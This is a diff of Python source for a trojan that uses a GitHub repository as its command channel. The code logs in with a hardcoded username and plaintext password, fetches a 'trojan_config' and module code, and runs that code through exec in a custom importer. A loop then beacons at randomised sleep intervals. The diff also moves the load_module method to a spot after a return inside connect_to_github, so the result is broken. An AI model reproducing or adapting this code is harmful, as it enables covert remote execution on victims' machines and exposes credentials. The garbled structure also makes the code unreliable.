@@ -39,24 +39,22 @@ class GitImporter(object):
 
         return None
 
-    def load_module(self,name):
-
-        module = imp.new_module(name)
-
-        exec self.current_module_code in module__dict__
-
-        sys.modules[name] = module
-
-        return module
-
-
-
 def connect_to_github():
+
     gh = login(username="chunkylover7",password="_r93G4sl/SI_JsA/")
     repo = gh.repository("chunkylover7","project_one")
     branch = repo.branch("master")    
 
     return gh,repo,branch
+    def load_module(self,name):
+
+        module = imp.new_module(name)
+
+        exec self.current_module_code in module.__dict__
+
+        sys.modules[name] = module
+
+        return module
 
 def get_file_contents(filepath):
 
@@ -76,6 +74,7 @@ def get_file_contents(filepath):
     return None
 
 def get_trojan_config():
+
     global configured
 
     config_json   = get_file_contents(trojan_config)
@@ -127,4 +126,3 @@ while True:
             time.sleep(random.randint(1,10))
 
     time.sleep(random.randint(1000,10000))
-
